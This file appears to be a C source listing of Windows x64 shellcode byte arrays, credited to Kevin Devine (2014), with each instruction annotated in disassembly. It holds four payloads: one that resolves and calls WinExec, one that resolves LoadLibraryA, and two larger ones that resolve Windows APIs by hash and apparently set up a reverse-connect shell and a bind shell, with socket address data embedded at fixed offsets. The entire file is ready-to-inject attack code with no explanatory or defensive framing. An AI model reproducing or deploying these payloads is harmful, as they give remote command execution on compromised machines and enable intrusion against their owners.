
/* Copyright (c) 2014 Kevin Devine */
/* Size = 99 bytes */

char exec64[] = {
  /* 0000 */  "\x53"                          /*  push rbx                           */
  /* 0001 */  "\x56"                          /*  push rsi                           */
  /* 0002 */  "\x57"                          /*  push rdi                           */
  /* 0003 */  "\x55"                          /*  push rbp                           */
  /* 0004 */  "\x48\x83\xEC\x48"              /*  sub rsp, 48h                       */
  /* 0008 */  "\xEB\x54"                      /*  jmp 0000005Eh                      */
  /* 000A */  "\x6A\x60"                      /*  push 00000060h                     */
  /* 000C */  "\x59"                          /*  pop rcx                            */
  /* 000D */  "\x65\x48\x8B\x31"              /*  mov rsi, qword ptr [rcx]           */
  /* 0011 */  "\x48\x8B\x76\x18"              /*  mov rsi, qword ptr [rsi+18h]       */
  /* 0015 */  "\x48\x8B\x76\x10"              /*  mov rsi, qword ptr [rsi+10h]       */
  /* 0019 */  "\x48\xAD"                      /*  lodsq                              */
  /* 001B */  "\x48\x8B\x30"                  /*  mov rsi, qword ptr [rax]           */
  /* 001E */  "\x48\x8B\x6E\x30"              /*  mov rbp, qword ptr [rsi+30h]       */
  /* 0022 */  "\x8B\x45\x3C"                  /*  mov eax, dword ptr [rbp+3Ch]       */
  /* 0025 */  "\x03\xC1"                      /*  add eax, ecx                       */
  /* 0027 */  "\x8B\x5C\x28\x28"              /*  mov ebx, dword ptr [rax+rbp+28h]   */
  /* 002B */  "\x48\x8D\x74\x2B\x1C"          /*  lea rsi, qword ptr [rbx+rbp+1Ch]   */
  /* 0030 */  "\xB1\x03"                      /*  mov cl, 03h                        */
  /* 0032 */  "\xAD"                          /*  lodsd                              */
  /* 0033 */  "\x48\x03\xC5"                  /*  add rax, rbp                       */
  /* 0036 */  "\x50"                          /*  push rax                           */
  /* 0037 */  "\xE2\xF9"                      /*  loop 00000032h                     */
  /* 0039 */  "\x5F"                          /*  pop rdi                            */
  /* 003A */  "\x5E"                          /*  pop rsi                            */
  /* 003B */  "\x5B"                          /*  pop rbx                            */
  /* 003C */  "\x0F\xB7\x14\x4F"              /*  movzx edx, word ptr [rdi+rcx*2]    */
  /* 0040 */  "\xFF\xC1"                      /*  inc ecx                            */
  /* 0042 */  "\xAD"                          /*  lodsd                              */
  /* 0043 */  "\x81\x3C\x28\x57\x69\x6E\x45"  /*  cmp dword ptr [rax+rbp], 456E6957h */
  /* 004A */  "\x75\xF0"                      /*  jne 0000003Ch                      */
  /* 004C */  "\x8B\x04\x93"                  /*  mov eax, dword ptr [rbx+rdx*4]     */
  /* 004F */  "\x48\x03\xC5"                  /*  add rax, rbp                       */
  /* 0052 */  "\x59"                          /*  pop rcx                            */
  /* 0053 */  "\xFF\xD0"                      /*  call rax                           */
  /* 0055 */  "\x48\x83\xC4\x48"              /*  add rsp, 48h                       */
  /* 0059 */  "\x5D"                          /*  pop rbp                            */
  /* 005A */  "\x5F"                          /*  pop rdi                            */
  /* 005B */  "\x5E"                          /*  pop rsi                            */
  /* 005C */  "\x5B"                          /*  pop rbx                            */
  /* 005D */  "\xC3"                          /*  ret                                */
  /* 005E */  "\xE8\xA7\xFF\xFF\xFF"          /*  call 0000000Ah                     */
};

/* Copyright (c) 2014 Kevin Devine */
/* Size = 106 bytes */

char load64[] = {
  /* 0000 */  "\x53"                          /*  push rbx                           */
  /* 0001 */  "\x56"                          /*  push rsi                           */
  /* 0002 */  "\x57"                          /*  push rdi                           */
  /* 0003 */  "\x55"                          /*  push rbp                           */
  /* 0004 */  "\x48\x83\xEC\x48"              /*  sub rsp, 48h                       */
  /* 0008 */  "\xEB\x5B"                      /*  jmp 00000065h                      */
  /* 000A */  "\x6A\x60"                      /*  push 00000060h                     */
  /* 000C */  "\x59"                          /*  pop rcx                            */
  /* 000D */  "\x65\x48\x8B\x31"              /*  mov rsi, qword ptr [rcx]           */
  /* 0011 */  "\x48\x8B\x76\x18"              /*  mov rsi, qword ptr [rsi+18h]       */
  /* 0015 */  "\x48\x8B\x76\x10"              /*  mov rsi, qword ptr [rsi+10h]       */
  /* 0019 */  "\x48\xAD"                      /*  lodsq                              */
  /* 001B */  "\x48\x8B\x30"                  /*  mov rsi, qword ptr [rax]           */
  /* 001E */  "\x48\x8B\x6E\x30"              /*  mov rbp, qword ptr [rsi+30h]       */
  /* 0022 */  "\x8B\x45\x3C"                  /*  mov eax, dword ptr [rbp+3Ch]       */
  /* 0025 */  "\x03\xC1"                      /*  add eax, ecx                       */
  /* 0027 */  "\x8B\x5C\x28\x28"              /*  mov ebx, dword ptr [rax+rbp+28h]   */
  /* 002B */  "\x48\x8D\x74\x2B\x1C"          /*  lea rsi, qword ptr [rbx+rbp+1Ch]   */
  /* 0030 */  "\xB1\x03"                      /*  mov cl, 03h                        */
  /* 0032 */  "\xAD"                          /*  lodsd                              */
  /* 0033 */  "\x48\x03\xC5"                  /*  add rax, rbp                       */
  /* 0036 */  "\x50"                          /*  push rax                           */
  /* 0037 */  "\xE2\xF9"                      /*  loop 00000032h                     */
  /* 0039 */  "\x5F"                          /*  pop rdi                            */
  /* 003A */  "\x5E"                          /*  pop rsi                            */
  /* 003B */  "\x5B"                          /*  pop rbx                            */
  /* 003C */  "\x0F\xB7\x14\x4F"              /*  movzx edx, word ptr [rdi+rcx*2]    */
  /* 0040 */  "\xFF\xC1"                      /*  inc ecx                            */
  /* 0042 */  "\xAD"                          /*  lodsd                              */
  /* 0043 */  "\x81\x3C\x28\x4C\x6F\x61\x64"  /*  cmp dword ptr [rax+rbp], 64616F4Ch */
  /* 004A */  "\x75\xF0"                      /*  jne 0000003Ch                      */
  /* 004C */  "\x80\x7C\x28\x0B\x41"          /*  cmp byte ptr [rax+rbp+0Bh], 41h    */
  /* 0051 */  "\x75\xE9"                      /*  jne 0000003Ch                      */
  /* 0053 */  "\x8B\x04\x93"                  /*  mov eax, dword ptr [rbx+rdx*4]     */
  /* 0056 */  "\x48\x03\xC5"                  /*  add rax, rbp                       */
  /* 0059 */  "\x59"                          /*  pop rcx                            */
  /* 005A */  "\xFF\xD0"                      /*  call rax                           */
  /* 005C */  "\x48\x83\xC4\x48"              /*  add rsp, 48h                       */
  /* 0060 */  "\x5D"                          /*  pop rbp                            */
  /* 0061 */  "\x5F"                          /*  pop rdi                            */
  /* 0062 */  "\x5E"                          /*  pop rsi                            */
  /* 0063 */  "\x5B"                          /*  pop rbx                            */
  /* 0064 */  "\xC3"                          /*  ret                                */
  /* 0065 */  "\xE8\xA0\xFF\xFF\xFF"          /*  call 0000000Ah                     */
};

/* Copyright (c) 2014 Kevin Devine */
/* Size = 353 bytes */


#define REV_OVERLAP64_DATA_OFFSET 0xC3

char rev_overlap64[] = {
  /* 0000 */  "\xC3"                  /*  ret                                */
  /* 0001 */  "\xDC\x53\x56"          /*  fcom qword ptr [rbx+56h]           */
  /* 0004 */  "\x57"                  /*  push rdi                           */
  /* 0005 */  "\x55"                  /*  push rbp                           */
  /* 0006 */  "\x41\x54"              /*  push r12                           */
  /* 0008 */  "\x41\x55"              /*  push r13                           */
  /* 000A */  "\x41\x56"              /*  push r14                           */
  /* 000C */  "\x41\x57"              /*  push r15                           */
  /* 000E */  "\x4C\x8B\xFC"          /*  mov r15, rsp                       */
  /* 0011 */  "\x48\x83\xE4\xF0"      /*  and rsp, FFFFFFFFFFFFFFF0h         */
  /* 0015 */  "\x48\x83\xEC\x78"      /*  sub rsp, 78h                       */
  /* 0019 */  "\xF9"                  /*  stc                                */
  /* 001A */  "\xEB\x6F"              /*  jmp 0000008Bh                      */
  /* 001C */  "\x5E"                  /*  pop rsi                            */
  /* 001D */  "\x48\x8D\x6E\x24"      /*  lea rbp, qword ptr [rsi+24h]       */
  /* 0021 */  "\x33\xC0"              /*  xor eax, eax                       */
  /* 0023 */  "\x99"                  /*  cdq                                */
  /* 0024 */  "\xB2\xE8"              /*  mov dl, E8h                        */
  /* 0026 */  "\x48\x2B\xE2"          /*  sub rsp, rdx                       */
  /* 0029 */  "\x8B\xCA"              /*  mov ecx, edx                       */
  /* 002B */  "\x48\x8B\xFC"          /*  mov rdi, rsp                       */
  /* 002E */  "\xF3\xAA"              /*  rep stosb                          */
  /* 0030 */  "\xB8\x9C\x92\x9B\xFF"  /*  mov eax, FF9B929Ch                 */
  /* 0035 */  "\xF7\xD0"              /*  not eax                            */
  /* 0037 */  "\x48\x8D\x7C\x24\x50"  /*  lea rdi, qword ptr [rsp+50h]       */
  /* 003C */  "\x4C\x8B\xE7"          /*  mov r12, rdi                       */
  /* 003F */  "\x48\xAB"              /*  stosq                              */
  /* 0041 */  "\x4C\x8B\xEF"          /*  mov r13, rdi                       */
  /* 0044 */  "\x48\xAD"              /*  lodsq                              */
  /* 0046 */  "\x48\xF7\xD0"          /*  not rax                            */
  /* 0049 */  "\x48\xAB"              /*  stosq                              */
  /* 004B */  "\x48\xAF"              /*  scasq                              */
  /* 004D */  "\x4C\x8B\xF7"          /*  mov r14, rdi                       */
  /* 0050 */  "\x6A\x60"              /*  push 00000060h                     */
  /* 0052 */  "\x58"                  /*  pop rax                            */
  /* 0053 */  "\xAB"                  /*  stosd                              */
  /* 0054 */  "\x41\xFF\x46\x39"      /*  inc dword ptr [r14+39h]            */
  /* 0058 */  "\x4C\x89\x74\x24\x40"  /*  mov qword ptr [rsp+40h], r14       */
  /* 005D */  "\x49\x8D\x7E\x48"      /*  lea rdi, qword ptr [r14+48h]       */
  /* 0061 */  "\x4D\x33\xC9"          /*  xor r9, r9                         */
  /* 0064 */  "\x4D\x33\xC0"          /*  xor r8, r8                         */
  /* 0067 */  "\xB2\x01"              /*  mov dl, 01h                        */
  /* 0069 */  "\xB1\x02"              /*  mov cl, 02h                        */
  /* 006B */  "\xFF\xD5"              /*  call rbp                           */
  /* 006D */  "\x48\xAB"              /*  stosq                              */
  /* 006F */  "\x48\xAB"              /*  stosq                              */
  /* 0071 */  "\x48\xAB"              /*  stosq                              */
  /* 0073 */  "\x48\xAF"              /*  scasq                              */
  /* 0075 */  "\x93"                  /*  xchg eax, ebx                      */
  /* 0076 */  "\x48\x89\x7C\x24\x48"  /*  mov qword ptr [rsp+48h], rdi       */
  /* 007B */  "\xFF\x44\x24\x20"      /*  inc dword ptr [rsp+20h]            */
  /* 007F */  "\x6A\x10"              /*  push 00000010h                     */
  /* 0081 */  "\x41\x58"              /*  pop r8                             */
  /* 0083 */  "\x49\x8B\xD5"          /*  mov rdx, r13                       */
  /* 0086 */  "\x8B\xCB"              /*  mov ecx, ebx                       */
  /* 0088 */  "\xFF\xD5"              /*  call rbp                           */
  /* 008A */  "\xF8"                  /*  clc                                */
  /* 008B */  "\x72\x33"              /*  jc 000000C0h                       */
  /* 008D */  "\x4D\x33\xC0"          /*  xor r8, r8                         */
  /* 0090 */  "\x4D\x33\xC9"          /*  xor r9, r9                         */
  /* 0093 */  "\x49\x8B\xD4"          /*  mov rdx, r12                       */
  /* 0096 */  "\x91"                  /*  xchg eax, ecx                      */
  /* 0097 */  "\xFF\xD5"              /*  call rbp                           */
  /* 0099 */  "\x83\xCA\xFF"          /*  or edx, FFFFFFFFh                  */
  /* 009C */  "\x48\x8B\x0F"          /*  mov rcx, qword ptr [rdi]           */
  /* 009F */  "\xFF\xD5"              /*  call rbp                           */
  /* 00A1 */  "\x48\x8B\x0F"          /*  mov rcx, qword ptr [rdi]           */
  /* 00A4 */  "\xFF\xD5"              /*  call rbp                           */
  /* 00A6 */  "\x48\x8B\x4F\x08"      /*  mov rcx, qword ptr [rdi+08h]       */
  /* 00AA */  "\xFF\xD5"              /*  call rbp                           */
  /* 00AC */  "\x8B\xCB"              /*  mov ecx, ebx                       */
  /* 00AE */  "\xFF\xD5"              /*  call rbp                           */
  /* 00B0 */  "\x49\x8B\xE7"          /*  mov rsp, r15                       */
  /* 00B3 */  "\x41\x5F"              /*  pop r15                            */
  /* 00B5 */  "\x41\x5E"              /*  pop r14                            */
  /* 00B7 */  "\x41\x5D"              /*  pop r13                            */
  /* 00B9 */  "\x41\x5C"              /*  pop r12                            */
  /* 00BB */  "\x5D"                  /*  pop rbp                            */
  /* 00BC */  "\x5F"                  /*  pop rdi                            */
  /* 00BD */  "\x5E"                  /*  pop rsi                            */
  /* 00BE */  "\x5B"                  /*  pop rbx                            */
  /* 00BF */  "\xC3"                  /*  ret                                */
  /* 00C0 */  "\xE8\x57\xFF\xFF\xFF"  /*  call 0000001Ch                     */
  /* 00C5 */  "\x00\x00\x00\x00"
  /* 00C9 */  "\x00\x00\x00\x00"
  /* 00CD */  "\xB2\xA5\xC1\x87"
  /* 00D1 */  "\xEC\x80\x9C\xE4"
  /* 00D5 */  "\xFE\xDF\x72\x17"
  /* 00D9 */  "\x4B\xDA\x38\x53"
  /* 00DD */  "\x35\xC9\x1E\x7F"
  /* 00E1 */  "\x35\xC9\x1E\x7F"
  /* 00E5 */  "\x6E\xED\xCD\xA2"
  /* 00E9 */  "\xAD"                  /*  lodsd                              */
  /* 00EA */  "\x50"                  /*  push rax                           */
  /* 00EB */  "\x51"                  /*  push rcx                           */
  /* 00EC */  "\x52"                  /*  push rdx                           */
  /* 00ED */  "\x53"                  /*  push rbx                           */
  /* 00EE */  "\x55"                  /*  push rbp                           */
  /* 00EF */  "\x56"                  /*  push rsi                           */
  /* 00F0 */  "\x57"                  /*  push rdi                           */
  /* 00F1 */  "\x6A\x60"              /*  push 00000060h                     */
  /* 00F3 */  "\x5E"                  /*  pop rsi                            */
  /* 00F4 */  "\x65\x48\xAD"          /*  lodsq                              */
  /* 00F7 */  "\x48\x8B\x40\x18"      /*  mov rax, qword ptr [rax+18h]       */
  /* 00FB */  "\x4C\x8B\x50\x30"      /*  mov r10, qword ptr [rax+30h]       */
  /* 00FF */  "\x49\x8B\x6A\x10"      /*  mov rbp, qword ptr [r10+10h]       */
  /* 0103 */  "\x4D\x8B\x12"          /*  mov r10, qword ptr [r10]           */
  /* 0106 */  "\x8B\x45\x3C"          /*  mov eax, dword ptr [rbp+3Ch]       */
  /* 0109 */  "\x83\xC0\x10"          /*  add eax, 10h                       */
  /* 010C */  "\x8B\x44\x28\x78"      /*  mov eax, dword ptr [rax+rbp+78h]   */
  /* 0110 */  "\x48\x8D\x74\x28\x18"  /*  lea rsi, qword ptr [rax+rbp+18h]   */
  /* 0115 */  "\xAD"                  /*  lodsd                              */
  /* 0116 */  "\x91"                  /*  xchg eax, ecx                      */
  /* 0117 */  "\x67\xE3\xE5"          /*  jecxz 000000FFh                    */
  /* 011A */  "\xAD"                  /*  lodsd                              */
  /* 011B */  "\x4C\x8D\x1C\x28"      /*  lea r11, qword ptr [rax+rbp]       */
  /* 011F */  "\xAD"                  /*  lodsd                              */
  /* 0120 */  "\x48\x8D\x3C\x28"      /*  lea rdi, qword ptr [rax+rbp]       */
  /* 0124 */  "\xAD"                  /*  lodsd                              */
  /* 0125 */  "\x48\x8D\x1C\x28"      /*  lea rbx, qword ptr [rax+rbp]       */
  /* 0129 */  "\x8B\x74\x8F\xFC"      /*  mov esi, dword ptr [rdi+rcx*4-04h] */
  /* 012D */  "\x48\x03\xF5"          /*  add rsi, rbp                       */
  /* 0130 */  "\x33\xC0"              /*  xor eax, eax                       */
  /* 0132 */  "\x99"                  /*  cdq                                */
  /* 0133 */  "\xAC"                  /*  lodsb                              */
  /* 0134 */  "\x03\xD0"              /*  add edx, eax                       */
  /* 0136 */  "\xC1\xC2\x07"          /*  rol edx, 07h                       */
  /* 0139 */  "\x33\xD0"              /*  xor edx, eax                       */
  /* 013B */  "\xFF\xC8"              /*  dec eax                            */
  /* 013D */  "\x79\xF4"              /*  jns 00000133h                      */
  /* 013F */  "\x48\x3B\x54\x24\x30"  /*  cmp rdx, qword ptr [rsp+30h]       */
  /* 0144 */  "\xE0\xE3"              /*  loopne 00000129h                   */
  /* 0146 */  "\x75\xB7"              /*  jne 000000FFh                      */
  /* 0148 */  "\x0F\xB7\x14\x4B"      /*  movzx edx, word ptr [rbx+rcx*2]    */
  /* 014C */  "\x41\x8B\x04\x93"      /*  mov eax, dword ptr [r11+rdx*4]     */
  /* 0150 */  "\x48\x03\xE8"          /*  add rbp, rax                       */
  /* 0153 */  "\x48\x89\x6C\x24\x30"  /*  mov qword ptr [rsp+30h], rbp       */
  /* 0158 */  "\x5F"                  /*  pop rdi                            */
  /* 0159 */  "\x5E"                  /*  pop rsi                            */
  /* 015A */  "\x5D"                  /*  pop rbp                            */
  /* 015B */  "\x5B"                  /*  pop rbx                            */
  /* 015C */  "\x5A"                  /*  pop rdx                            */
  /* 015D */  "\x59"                  /*  pop rcx                            */
  /* 015E */  "\x58"                  /*  pop rax                            */
  /* 015F */  "\xFF\xE0"              /*  jmp rax                            */
};

/* Copyright (c) 2014 Kevin Devine */
/* Size = 388 bytes */


#define BIND_OVERLAP64_DATA_OFFSET 0xDC

char bind_overlap64[] = {
  /* 0000 */  "\x53"                  /*  push rbx                           */
  /* 0001 */  "\x56"                  /*  push rsi                           */
  /* 0002 */  "\x57"                  /*  push rdi                           */
  /* 0003 */  "\x55"                  /*  push rbp                           */
  /* 0004 */  "\x41\x54"              /*  push r12                           */
  /* 0006 */  "\x41\x55"              /*  push r13                           */
  /* 0008 */  "\x41\x56"              /*  push r14                           */
  /* 000A */  "\x41\x57"              /*  push r15                           */
  /* 000C */  "\x4C\x8B\xFC"          /*  mov r15, rsp                       */
  /* 000F */  "\x48\x83\xE4\xF0"      /*  and rsp, FFFFFFFFFFFFFFF0h         */
  /* 0013 */  "\x48\x83\xEC\x78"      /*  sub rsp, 78h                       */
  /* 0017 */  "\xF9"                  /*  stc                                */
  /* 0018 */  "\xEB\x71"              /*  jmp 0000008Bh                      */
  /* 001A */  "\x5E"                  /*  pop rsi                            */
  /* 001B */  "\x48\x8D\x6E\x30"      /*  lea rbp, qword ptr [rsi+30h]       */
  /* 001F */  "\x33\xC0"              /*  xor eax, eax                       */
  /* 0021 */  "\x99"                  /*  cdq                                */
  /* 0022 */  "\xB2\xE8"              /*  mov dl, E8h                        */
  /* 0024 */  "\x48\x2B\xE2"          /*  sub rsp, rdx                       */
  /* 0027 */  "\x8B\xCA"              /*  mov ecx, edx                       */
  /* 0029 */  "\x48\x8B\xFC"          /*  mov rdi, rsp                       */
  /* 002C */  "\xF3\xAA"              /*  rep stosb                          */
  /* 002E */  "\xB8\x9C\x92\x9B\xFF"  /*  mov eax, FF9B929Ch                 */
  /* 0033 */  "\xF7\xD0"              /*  not eax                            */
  /* 0035 */  "\x48\x8D\x7C\x24\x50"  /*  lea rdi, qword ptr [rsp+50h]       */
  /* 003A */  "\x4C\x8B\xE7"          /*  mov r12, rdi                       */
  /* 003D */  "\x48\xAB"              /*  stosq                              */
  /* 003F */  "\x4C\x8B\xEF"          /*  mov r13, rdi                       */
  /* 0042 */  "\x48\xAD"              /*  lodsq                              */
  /* 0044 */  "\x48\xF7\xD0"          /*  not rax                            */
  /* 0047 */  "\x48\xAB"              /*  stosq                              */
  /* 0049 */  "\x48\xAF"              /*  scasq                              */
  /* 004B */  "\x4C\x8B\xF7"          /*  mov r14, rdi                       */
  /* 004E */  "\x6A\x68"              /*  push 00000068h                     */
  /* 0050 */  "\x58"                  /*  pop rax                            */
  /* 0051 */  "\xAB"                  /*  stosd                              */
  /* 0052 */  "\x41\xFF\x46\x3D"      /*  inc dword ptr [r14+3Dh]            */
  /* 0056 */  "\x4C\x89\x74\x24\x40"  /*  mov qword ptr [rsp+40h], r14       */
  /* 005B */  "\x49\x8D\x7E\x50"      /*  lea rdi, qword ptr [r14+50h]       */
  /* 005F */  "\x4D\x33\xC9"          /*  xor r9, r9                         */
  /* 0062 */  "\x4D\x33\xC0"          /*  xor r8, r8                         */
  /* 0065 */  "\xB2\x01"              /*  mov dl, 01h                        */
  /* 0067 */  "\xB1\x02"              /*  mov cl, 02h                        */
  /* 0069 */  "\xFF\xD5"              /*  call rbp                           */
  /* 006B */  "\x93"                  /*  xchg eax, ebx                      */
  /* 006C */  "\x6A\x10"              /*  push 00000010h                     */
  /* 006E */  "\x41\x58"              /*  pop r8                             */
  /* 0070 */  "\x49\x8B\xD5"          /*  mov rdx, r13                       */
  /* 0073 */  "\x8B\xCB"              /*  mov ecx, ebx                       */
  /* 0075 */  "\xFF\xD5"              /*  call rbp                           */
  /* 0077 */  "\x4D\x33\xC0"          /*  xor r8, r8                         */
  /* 007A */  "\x92"                  /*  xchg eax, edx                      */
  /* 007B */  "\x8B\xCB"              /*  mov ecx, ebx                       */
  /* 007D */  "\xFF\xD5"              /*  call rbp                           */
  /* 007F */  "\x4D\x33\xC0"          /*  xor r8, r8                         */
  /* 0082 */  "\x92"                  /*  xchg eax, edx                      */
  /* 0083 */  "\x8B\xCB"              /*  mov ecx, ebx                       */
  /* 0085 */  "\xFF\xD5"              /*  call rbp                           */
  /* 0087 */  "\x4C\x8B\xF0"          /*  mov r14, rax                       */
  /* 008A */  "\xF8"                  /*  clc                                */
  /* 008B */  "\x72\x4A"              /*  jc 000000D7h                       */
  /* 008D */  "\x48\xAB"              /*  stosq                              */
  /* 008F */  "\x48\xAB"              /*  stosq                              */
  /* 0091 */  "\x48\xAB"              /*  stosq                              */
  /* 0093 */  "\x48\xAF"              /*  scasq                              */
  /* 0095 */  "\x48\x89\x7C\x24\x48"  /*  mov qword ptr [rsp+48h], rdi       */
  /* 009A */  "\xFF\x44\x24\x20"      /*  inc dword ptr [rsp+20h]            */
  /* 009E */  "\x4D\x33\xC0"          /*  xor r8, r8                         */
  /* 00A1 */  "\x4D\x33\xC9"          /*  xor r9, r9                         */
  /* 00A4 */  "\x49\x8B\xD4"          /*  mov rdx, r12                       */
  /* 00A7 */  "\x33\xC9"              /*  xor ecx, ecx                       */
  /* 00A9 */  "\xFF\xD5"              /*  call rbp                           */
  /* 00AB */  "\x83\xCA\xFF"          /*  or edx, FFFFFFFFh                  */
  /* 00AE */  "\x48\x8B\x0F"          /*  mov rcx, qword ptr [rdi]           */
  /* 00B1 */  "\xFF\xD5"              /*  call rbp                           */
  /* 00B3 */  "\x48\x8B\x0F"          /*  mov rcx, qword ptr [rdi]           */
  /* 00B6 */  "\xFF\xD5"              /*  call rbp                           */
  /* 00B8 */  "\x48\x8B\x4F\x08"      /*  mov rcx, qword ptr [rdi+08h]       */
  /* 00BC */  "\xFF\xD5"              /*  call rbp                           */
  /* 00BE */  "\x49\x8B\xCE"          /*  mov rcx, r14                       */
  /* 00C1 */  "\xFF\xD5"              /*  call rbp                           */
  /* 00C3 */  "\x8B\xCB"              /*  mov ecx, ebx                       */
  /* 00C5 */  "\xFF\xD5"              /*  call rbp                           */
  /* 00C7 */  "\x49\x8B\xE7"          /*  mov rsp, r15                       */
  /* 00CA */  "\x41\x5F"              /*  pop r15                            */
  /* 00CC */  "\x41\x5E"              /*  pop r14                            */
  /* 00CE */  "\x41\x5D"              /*  pop r13                            */
  /* 00D0 */  "\x41\x5C"              /*  pop r12                            */
  /* 00D2 */  "\x5D"                  /*  pop rbp                            */
  /* 00D3 */  "\x5F"                  /*  pop rdi                            */
  /* 00D4 */  "\x5E"                  /*  pop rsi                            */
  /* 00D5 */  "\x5B"                  /*  pop rbx                            */
  /* 00D6 */  "\xC3"                  /*  ret                                */
  /* 00D7 */  "\xE8\x3E\xFF\xFF\xFF"  /*  call 0000001Ah                     */
  /* 00DC */  "\x00\x00\x00\x00"
  /* 00E0 */  "\x00\x00\x00\x00"
  /* 00E4 */  "\xB2\xA5\xC1\x87"
  /* 00E8 */  "\x1C\xB1\x14\xCB"
  /* 00EC */  "\xEE\xAD\xFD\x8A"
  /* 00F0 */  "\x3C\x2C\x96\x9A"
  /* 00F4 */  "\xFE\xDF\x72\x17"
  /* 00F8 */  "\x4B\xDA\x38\x53"
  /* 00FC */  "\x35\xC9\x1E\x7F"
  /* 0100 */  "\x35\xC9\x1E\x7F"
  /* 0104 */  "\x6E\xED\xCD\xA2"
  /* 0108 */  "\x6E\xED\xCD\xA2"
  /* 010C */  "\xAD"                  /*  lodsd                              */
  /* 010D */  "\x50"                  /*  push rax                           */
  /* 010E */  "\x51"                  /*  push rcx                           */
  /* 010F */  "\x52"                  /*  push rdx                           */
  /* 0110 */  "\x53"                  /*  push rbx                           */
  /* 0111 */  "\x55"                  /*  push rbp                           */
  /* 0112 */  "\x56"                  /*  push rsi                           */
  /* 0113 */  "\x57"                  /*  push rdi                           */
  /* 0114 */  "\x6A\x60"              /*  push 00000060h                     */
  /* 0116 */  "\x5E"                  /*  pop rsi                            */
  /* 0117 */  "\x65\x48\xAD"          /*  lodsq                              */
  /* 011A */  "\x48\x8B\x40\x18"      /*  mov rax, qword ptr [rax+18h]       */
  /* 011E */  "\x4C\x8B\x50\x30"      /*  mov r10, qword ptr [rax+30h]       */
  /* 0122 */  "\x49\x8B\x6A\x10"      /*  mov rbp, qword ptr [r10+10h]       */
  /* 0126 */  "\x4D\x8B\x12"          /*  mov r10, qword ptr [r10]           */
  /* 0129 */  "\x8B\x45\x3C"          /*  mov eax, dword ptr [rbp+3Ch]       */
  /* 012C */  "\x83\xC0\x10"          /*  add eax, 10h                       */
  /* 012F */  "\x8B\x44\x28\x78"      /*  mov eax, dword ptr [rax+rbp+78h]   */
  /* 0133 */  "\x48\x8D\x74\x28\x18"  /*  lea rsi, qword ptr [rax+rbp+18h]   */
  /* 0138 */  "\xAD"                  /*  lodsd                              */
  /* 0139 */  "\x91"                  /*  xchg eax, ecx                      */
  /* 013A */  "\x67\xE3\xE5"          /*  jecxz 00000122h                    */
  /* 013D */  "\xAD"                  /*  lodsd                              */
  /* 013E */  "\x4C\x8D\x1C\x28"      /*  lea r11, qword ptr [rax+rbp]       */
  /* 0142 */  "\xAD"                  /*  lodsd                              */
  /* 0143 */  "\x48\x8D\x3C\x28"      /*  lea rdi, qword ptr [rax+rbp]       */
  /* 0147 */  "\xAD"                  /*  lodsd                              */
  /* 0148 */  "\x48\x8D\x1C\x28"      /*  lea rbx, qword ptr [rax+rbp]       */
  /* 014C */  "\x8B\x74\x8F\xFC"      /*  mov esi, dword ptr [rdi+rcx*4-04h] */
  /* 0150 */  "\x48\x03\xF5"          /*  add rsi, rbp                       */
  /* 0153 */  "\x33\xC0"              /*  xor eax, eax                       */
  /* 0155 */  "\x99"                  /*  cdq                                */
  /* 0156 */  "\xAC"                  /*  lodsb                              */
  /* 0157 */  "\x03\xD0"              /*  add edx, eax                       */
  /* 0159 */  "\xC1\xC2\x07"          /*  rol edx, 07h                       */
  /* 015C */  "\x33\xD0"              /*  xor edx, eax                       */
  /* 015E */  "\xFF\xC8"              /*  dec eax                            */
  /* 0160 */  "\x79\xF4"              /*  jns 00000156h                      */
  /* 0162 */  "\x48\x3B\x54\x24\x30"  /*  cmp rdx, qword ptr [rsp+30h]       */
  /* 0167 */  "\xE0\xE3"              /*  loopne 0000014Ch                   */
  /* 0169 */  "\x75\xB7"              /*  jne 00000122h                      */
  /* 016B */  "\x0F\xB7\x14\x4B"      /*  movzx edx, word ptr [rbx+rcx*2]    */
  /* 016F */  "\x41\x8B\x04\x93"      /*  mov eax, dword ptr [r11+rdx*4]     */
  /* 0173 */  "\x48\x03\xE8"          /*  add rbp, rax                       */
  /* 0176 */  "\x48\x89\x6C\x24\x30"  /*  mov qword ptr [rsp+30h], rbp       */
  /* 017B */  "\x5F"                  /*  pop rdi                            */
  /* 017C */  "\x5E"                  /*  pop rsi                            */
  /* 017D */  "\x5D"                  /*  pop rbp                            */
  /* 017E */  "\x5B"                  /*  pop rbx                            */
  /* 017F */  "\x5A"                  /*  pop rdx                            */
  /* 0180 */  "\x59"                  /*  pop rcx                            */
  /* 0181 */  "\x58"                  /*  pop rax                            */
  /* 0182 */  "\xFF\xE0"              /*  jmp rax                            */
};
